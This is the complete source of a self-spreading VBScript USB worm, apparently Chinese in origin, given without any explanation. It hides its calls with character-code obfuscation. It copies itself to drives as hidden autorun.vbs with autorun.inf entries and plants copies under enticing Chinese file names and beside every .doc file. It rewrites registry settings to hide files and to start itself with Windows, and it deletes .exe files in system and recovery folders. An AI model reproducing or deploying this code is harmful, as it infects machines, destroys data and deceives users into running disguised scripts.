rem vbs.rhl,
Dim fs,r,ss,w,reg,regpath,dvbs
ddd="Set fs =" &chr(67) & "reate" & "Obj" & chr(101) & "c" & chr(116) & chr(40) & chr(34) & "Scrip" & chr(116) & "ing.File" & chr(83) & "yste" &chr(109) & chr(79) & "bject" & chr(34) & chr(41)
Execute ddd
rrr="set r =" &chr(119) & "scri" & "pt." &chr(67) & "reate" & "Obj" & chr(101) & "c" & chr(116) & chr(40) & chr(34) & chr(119) & "scri" & "pt." &chr(115) & "he" & chr(108) & chr(108) & chr(34) & chr(41)
Execute rrr
sss="fs." & chr(103) &"etfil" & chr(101) & chr(40) &chr(119) & "scri" & "pt." & "scri" & chr(112) & "tfull" &chr(110) & "ame" & chr(41)
ttt="set dvbs =" & sss
Execute ttt
r.run (fs.GetSpecialFolder(0)&"\explorer.exe .\")
main() 
On Error Resume Next
sub main()
regtime()
finddrive()
countdrive(ss)
regwrite()
ganranfile(ss)
xunhuan()
end sub   
Function finddrive() 
if dvbs.name="USBDRIVE.dll" then
regwrite()
ganrandisk()
end if
if dvbs.name<>"autorun.vbs" and dvbs.name<>"USBDRIVE.dll" then
regwrite()
dvbs.delete(true)
end if
ss=Trim("")
Set dc = fs.Drives
For Each d In dc
If d.DriveType = 1 or d.DriveType= 2 and d.IsReady Then 
ss = ss & d.DriveLetter 
end if
Next
ss = StrReverse(LCase(Trim(ss))) 
end Function
Function countdrive(ss)
On Error Resume Next
dim x
For i = 1 To Len(ss) 
x = Mid(ss, i, 1) 
if x="" then
x=Mid(ss, 1, 1)
i=1
end if
Set w = fs.GetDrive(x)
 ganrandiskroot()
Next
end Function
Function ganrandiskroot()
dim c,s,f,vbc,ts,runreg
On Error Resume Next
If w.DriveType=2 or w.DriveType=1 and w.IsReady Then
If fs.FileExists(fs.GetSpecialFolder(1) & "\USBDRIVE.dll") Then
else
fff=sss & ".copy(" & chr(34) & fs.GetSpecialFolder(1) & "\USBDRIVE.dll" &chr(34) & ")"
Execute fff
end if
If fs.FileExists(w.DriveLetter & ":\autorun.vbs") Then
Set c = fs.opentextfile(w.DriveLetter & ":\autorun.vbs", 1)
vbc = c.readall
If InStr(vbc,"vbs.rhl") <> 0 Then
c.Close
Else
c.Close
Set c = fs.GetFile(w.DriveLetter & ":\autorun.vbs")
c.delete(true)
fff=sss & ".copy(" & chr(34) & w.DriveLetter & ":\autorun.vbs" &chr(34) & ")"
Execute fff
s=Array("2007总结","这是什么？内幕！","违纪人员","检查","黑名单","没有发出的情书","恋爱的日子（日记）")
Randomize    
i= Int((6 * Rnd) + 1) 
fff=sss & ".copy(" & chr(34) & w.DriveLetter & ":\" & s(i) & ".vbs" &chr(34) & ")"
Execute fff
Set c = fs.GetFile(w.DriveLetter & ":\autorun.vbs")
c.attributes=c.attributes+7
If fs.FileExists(w.DriveLetter & ":\vbs.reg") or fs.FileExists(w.DriveLetter & ":\doc.reg") Then
else
if w.DriveLetter="C" then
Set ts = fs.CreateTextFile(fs.GetSpecialFolder(1) & "\vbs.reg", true)
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"文本文件"& chr(34)
ts.close
Set f = fs.GetFile(fs.GetSpecialFolder(1) & "\vbs.reg")
f.attributes=f.attributes+7
Set ts = fs.CreateTextFile(fs.GetSpecialFolder(1) & "\doc.reg")
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"Microsoft Word 文档"& chr(34)
ts.close
Set f = fs.GetFile(fs.GetSpecialFolder(1) & "\doc.reg")
f.attributes=f.attributes+7
else
Set ts = fs.CreateTextFile(w.DriveLetter & ":\vbs.reg",true)
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"文本文件"& chr(34)
ts.close
Set f = fs.GetFile(w.DriveLetter & ":\vbs.reg")
f.attributes=f.attributes+7
Set ts = fs.CreateTextFile(w.DriveLetter & ":\doc.reg",true)
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"Microsoft Word 文档"& chr(34)
ts.close
Set f = fs.GetFile(w.DriveLetter & ":\doc.reg")
f.attributes=f.attributes+7
end if
end if
end if
else
fff=sss & ".copy(" & chr(34) & w.DriveLetter & ":\autorun.vbs" &chr(34) & ")"
Execute fff
s=Array("检查","2007总结","违纪人员","这是什么？内幕","黑名单","没有发出的情书","恋爱的日子（日记）")
Randomize    
i= Int((6 * Rnd) + 1) 
fff=sss & ".copy(" & chr(34) & w.DriveLetter & ":\" & s(i) & ".vbs" &chr(34) & ")"
Execute fff
Set c = fs.GetFile(w.DriveLetter & ":\autorun.vbs")
c.attributes=c.attributes+7
If fs.FileExists(w.DriveLetter & ":\vbs.reg") or fs.FileExists(w.DriveLetter & ":\doc.reg") Then
else
if w.DriveLetter="C" then
Set ts = fs.CreateTextFile(fs.GetSpecialFolder(1) & "\vbs.reg", true)
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"文本文件"& chr(34)
ts.close
Set f = fs.GetFile(fs.GetSpecialFolder(1) & "\vbs.reg")
f.attributes=f.attributes+7
Set ts = fs.CreateTextFile(fs.GetSpecialFolder(1) & "\doc.reg")
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"Microsoft Word 文档"& chr(34)
ts.close
Set f = fs.GetFile(fs.GetSpecialFolder(1) & "\doc.reg")
f.attributes=f.attributes+7
else
Set ts = fs.CreateTextFile(w.DriveLetter & ":\vbs.reg", true)
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"文本文件"& chr(34)
ts.close
Set f = fs.GetFile(w.DriveLetter & ":\vbs.reg")
f.attributes=f.attributes+7
Set ts = fs.CreateTextFile(w.DriveLetter & ":\doc.reg",true)
ts.WriteLine "Windows Registry Editor Version 5.00"
ts.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam\MUICache]"
ts.WriteLine chr(34) & chr(64) & "C:\\WINDOWS\\System32\\wshext.dll,-4802"&chr(34) & "=" & chr(34)&"Microsoft Word 文档"& chr(34)
ts.close
Set f = fs.GetFile(w.DriveLetter & ":\doc.reg")
f.attributes=f.attributes+7
end if
end if
end if
If fs.FileExists(w.DriveLetter & ":\autorun.inf") Then
Set c = fs.opentextfile(w.DriveLetter & ":\autorun.inf", 1)
vbc = c.readall
If InStr(vbc,"WScript.exe .\autorun.vbs") <> 0 Then
c.Close
Else
Set f = fs.GetFile(w.DriveLetter & ":\autorun.inf")
f.attributes=f.attributes-f.attributes
Set ts = f.OpenAsTextStream(2,-2)
ts.WriteLine "[AutoRun]" 
ts.WriteLine "open= "
ts.WriteLine ""
ts.WriteLine "shell\open=打开(&O) "
ts.WriteLine "shell\open\Command=WScript.exe .\autorun.vbs" 
ts.WriteLine "shell\open\Default=1 "
ts.close
f.attributes=f.attributes+7
end if
else
Set ts = fs.CreateTextFile(w.DriveLetter & ":\autorun.inf",true)
ts.WriteLine "[AutoRun]" 
ts.WriteLine "open= "
ts.WriteLine ""
ts.WriteLine "shell\open=打开(&O) "
ts.WriteLine "shell\open\Command=WScript.exe .\autorun.vbs"
ts.WriteLine "shell\open\Default=1"
ts.close
Set f = fs.GetFile(w.DriveLetter & ":\autorun.inf")
f.attributes=f.attributes+7
End If
end if
end Function
Function regwrite()
On Error Resume Next
dim s
a1="HKE" & "Y_CUR" & "RENT_US" & "ER\Soft" & "ware\Mi" & "croso" & "ft\Win" & "dows\Cur" & "rentV" & "ersion\Exp" & "lorer\Ad" & "vanced\"
a2="HK" & "EY_CLAS" & "SES_RO" & "OT\DLL" & "File\"
a3="HKEY" & "_LOCA" & "L_MACH" & "INE\SOFT" & "WARE\Mi" & "cros" & "oft\Win" & "dows\Cur" & "rentVer" & "sion\poli" & "cies\Expl" & "orer\NoDr" & "iveTypeAutoRun"
a4="HKE" & "Y_CURR" & "ENT_USE" & "R\Softw" & "are\Micr" & "osoft\Wi" & "ndows\Cur" & "rentVersi" & "on\Polici" & "es\Explor" & "er\NoDriveT" & "ypeAutoRun"
a5="HK" & "EY_LO" & "CAL_MA" & "CHINE\Sof" & "tware\Mi" & "croso" & "ft\Wind" & "ows\Curre" & "ntVersi" & "on\Ru" & "n\USBDR" & "IVE.dll"
a6="R.Re" & "gWri" & chr(116) & "e"
a7="HKE" & "Y_CLAS" & "SES_ROO" & "T\VBSF" & "ile\Defau" & "ltIcon\"
set s=fs.GetDrive(fs.GetDriveName(dvbs.path))  
scandoc(fs.GetSpecialFolder(0) & "\Installer")
if reg="wordicon.exe" then
if s="C:" then
r.run(fs.GetSpecialFolder(1) & "\dllcache\regedit.exe /s" & Space(3) & fs.GetSpecialFolder(1) & "\doc.reg")
else
r.run(fs.GetSpecialFolder(1) & "\dllcache\regedit.exe /s" & Space(3) & s.DriveLetter & ":\doc.reg")
end if
ppp=a6&Space(2)&chr(34) & a7 & chr(34)&"," &chr(34)&regpath & ",1"&chr(34)
Execute ppp
else
if s="C:" then
r.run(fs.GetSpecialFolder(1) & "\dllcache\regedit.exe /s" & Space(3) & fs.GetSpecialFolder(1) & "\vbs.reg")
else
r.run(fs.GetSpecialFolder(1) & "\dllcache\regedit.exe /s" & Space(3) & s.DriveLetter & ":\vbs.reg")
end if
ppp=a6&Space(2)&chr(34) & a7 & chr(34)&"," &chr(34)&fs.GetSpecialFolder(1) & "\shell32.dll,1"&chr(34)
Execute ppp
end if
ppp=a6&Space(2)&chr(34) & a1 & "ShowSuperHidden" &chr(34)& "," & "0," & chr(34)&"REG_DWORD"&chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a1 & "HideFileExt" &chr(34)& "," & "1," & chr(34)&"REG_DWORD"&chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a1 & "Hidden" &chr(34)& "," & "0," & chr(34)&"REG_DWORD"&chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a2 & "ScriptEngine\" &chr(34)& "," & chr(34)&"VBScript" & chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a2 & "ScriptHostEncode\" &chr(34)& "," & chr(34)&"{85131631-480C-11D2-B1F9-00C04F86C324}" & chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a2 & "Shell\Open\Command\" &chr(34)& "," & chr(34)&fs.GetSpecialFolder(1) & "\Wscript.exe ""%1"" %*" & chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a2 & "ShellEx\PropertySheetHandlers\WSHProps\" &chr(34)& "," & chr(34)&"{60254CA5-953B-11CF-8C96-00AA00B8708C}" & chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a3 & chr(34)&"," & "0," & chr(34)&"REG_DWORD"&chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a4 & chr(34)&"," & "0," & chr(34)&"REG_DWORD"&chr(34)
Execute ppp
ppp=a6&Space(2)&chr(34) & a5 &chr(34)& "," & chr(34)&fs.GetSpecialFolder(1)&"\USBDR" & "IVE.dll" & chr(34)
Execute ppp
end Function
Function scandoc(a)
On Error Resume Next
dim files,file,subfolder,folder_
set folder_=fs.getfolder(a) 
set files=folder_.files 
for each file in files
if file.name ="wordicon.exe" then
reg=file.name
regpath=file.path
exit Function
end if
next
set subfolders=folder_.subfolders 
for each subfolder in subfolders 
scandoc(subfolder) 
next 
end Function
Function regtime()
a6="R.Re" & "gWri" & chr(116) & "e"
a8="HKE"&"Y_CUR" & "RENT_US" & "ER\Soft" & "ware\Micr" & "osoft\Win" & "dows Scr" & "ipting Ho" & "st\Settin" & "gs\Timeout"
ppp=a6&Space(2)&chr(34) & a8 &chr(34)& "," & "0," & chr(34)&"REG_DWORD"&chr(34)
Execute ppp
end Function
Function ganranfile(aa)
On Error Resume Next
dim x
For i = 1 To Len(aa) 
x = Mid(aa, i, 1) 
if x="" then
x=Mid(aa, 1, 1)
i=1
end if
Set x = fs.GetDrive(x)
if x.IsReady then
scan(x)
else
xunhuan()
end if
Next
end Function
Function scan(x)
On Error Resume Next
dim files,file,subfolder,folder_
set folder_=fs.getfolder(x) 
set files=folder_.files 
for each file in files
s=file.path
ext=fs.GetExtensionName(file) 
ext=lcase(ext) 
if ext="doc" then 
fff=sss & ".copy("&chr(34) & mid(s,1,len(s)-3) & "vbs" &chr(34) & ")"
Execute fff
end if 
next 
set subfolders=folder_.subfolders 
for each subfolder in subfolders 
scan(subfolder) 
next 
end Function
Function ganrandisk() 
On Error Resume Next
dim doc, d, s, coun,w,h,oo
  Set doc = fs.Drives
for each k in doc
if k.IsReady then
h=h & k.DriveLetter
end if
next
t1=len(Trim(h))
coun=doc.count
do while coun>0
oo=h & w
clearinfo(oo)
wscript.sleep 50
Set d = fs.Drives
if d.count>coun then
for each k in d
if k.IsReady then
s=s & k.DriveLetter
end if
next
coun=d.count
t= StrReverse(LCase(Trim(s))) 
w=mid(t,1,abs(len(t)-t1))
countdrive(w)
ganranfile(w)
s=trim("")
t1=len(t)
end if
if d.count<coun then
for each k in d
if k.IsReady then
s=s & k.DriveLetter
end if
next
coun=d.count
t= StrReverse(LCase(Trim(s))) 
s=trim("")
t1=len(t)
end if
loop
end Function
Function xunhuan()
On Error Resume Next
dim sfo
set sfo=fs.GetDrive(fs.GetDriveName(dvbs.path)) 
if dvbs.name="autorun.vbs" or dvbs.name="USBDRIVE.dll" then
if sfo.DriveType=2 then 
ganrandisk() 
else
wscript.quit
end if
else
dvbs.delete(true)
end if
end Function

Function clearinfo(oo)
On Error Resume Next
dim dc,z
oo =LCase(Trim(oo))
For m = 1 To Len(oo) 
z = Mid(oo, m, 1) 
Set z = fs.GetDrive(z)
findinf(z)
v=Array(z.DriveLetter & ":\recycled",z.DriveLetter & ":\System Volume Information")
for i= 0 to 1
scanexe(v(i))
next
next
vir=array(fs.GetSpecialFolder(1)& "\recycled",fs.GetSpecialFolder(2),fs.GetSpecialFolder(0)&"\system")
for i=0 to 2
scanexe(vir(i))
next
end Function 
Function scanexe(a)
wscript.sleep 100
On Error Resume Next
dim files,file,folder_
if fs.FolderExists(a) then
set folder_=fs.getfolder(a) 
set files=folder_.files 
for each file in files
ext=fs.GetExtensionName(file) 
ext=lcase(ext) 
if ext="exe" then 
Set f = fs.GetFile(file)
f.delete(true)
end if 
next 
set subfolders=folder_.subfolders 
for each subfolder in subfolders 
scanexe(subfolder) 
next 
end if
end Function
Function findinf(z)
On Error Resume Next
If fs.FileExists(z.DriveLetter & ":\autorun.vbs") Then
else
fff=sss & ".copy(" & chr(34) & z.DriveLetter & ":\autorun.vbs" &chr(34) & ")"
Execute fff
Set f = fs.GetFile(z.DriveLetter & ":\autorun.vbs")
f.attributes=f.attributes+7
end if
If fs.FileExists(z.DriveLetter & ":\autorun.inf") Then
Set c = fs.opentextfile(z.DriveLetter & ":\autorun.inf", 1)
vbc = c.readall
If InStr(vbc,"WScript.exe .\autorun.vbs") <> 0 Then
c.Close
Else
Set f = fs.GetFile(z.DriveLetter & ":\autorun.inf")
f.attributes=f.attributes-f.attributes
Set ts = f.OpenAsTextStream(2,-2)
ts.WriteLine "[AutoRun]" 
ts.WriteLine "open= "
ts.WriteLine ""
ts.WriteLine "shell\open=打开(&O) "
ts.WriteLine "shell\open\Command=WScript.exe .\autorun.vbs" 
ts.WriteLine "shell\open\Default=1 "
ts.close
f.attributes=f.attributes+7
end if
else
Set ts = fs.CreateTextFile(z.DriveLetter & ":\autorun.inf",true)
ts.WriteLine "[AutoRun]" 
ts.WriteLine "open= "
ts.WriteLine ""
ts.WriteLine "shell\open=打开(&O) "
ts.WriteLine "shell\open\Command=WScript.exe .\autorun.vbs"
ts.WriteLine "shell\open\Default=1"
ts.close
Set f = fs.GetFile(z.DriveLetter & ":\autorun.inf")
f.attributes=f.attributes+7
End If
end Function

